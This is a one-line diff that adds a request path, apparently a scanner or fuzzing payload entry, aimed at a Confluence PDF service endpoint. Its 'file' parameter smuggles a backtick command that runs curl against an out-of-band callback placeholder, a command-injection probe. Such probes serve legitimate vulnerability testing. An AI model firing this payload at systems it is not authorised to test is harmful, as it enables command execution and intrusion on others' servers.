@@ -1,0 +1,1 @@
+/service.pdfs/confluence?lang=en&file=`curl+{{interactsh-url}}`
